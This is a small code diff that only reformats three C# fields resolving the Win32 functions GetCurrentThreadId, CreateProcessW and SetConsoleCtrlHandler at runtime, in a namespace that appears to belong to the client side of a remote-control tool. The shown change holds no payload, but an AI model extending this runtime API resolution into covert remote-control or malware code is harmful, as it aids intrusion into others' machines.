@@ -91,8 +91,13 @@ namespace BlackHole.Slave.Helper.Native.Impl
         [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
         public delegate bool dSetConsoleCtrlHandler(ConsoleHandler handler, bool add);
 
-        public static dGetCurrentThreadId GetCurrentThreadId = Instance.FindUmanagedFunction<dGetCurrentThreadId>("GetCurrentThreadId");
-        public static dCreateProcess CreateProcess = Instance.FindUmanagedFunction<dCreateProcess>("CreateProcessW");
-        public static dSetConsoleCtrlHandler SetConsoleCtrlHandler = Instance.FindUmanagedFunction<dSetConsoleCtrlHandler>("SetConsoleCtrlHandler");
+        public static dGetCurrentThreadId GetCurrentThreadId = 
+            Instance.FindUmanagedFunction<dGetCurrentThreadId>("GetCurrentThreadId");
+
+        public static dCreateProcess CreateProcess = 
+            Instance.FindUmanagedFunction<dCreateProcess>("CreateProcessW");
+
+        public static dSetConsoleCtrlHandler SetConsoleCtrlHandler = 
+            Instance.FindUmanagedFunction<dSetConsoleCtrlHandler>("SetConsoleCtrlHandler");
     }
 }
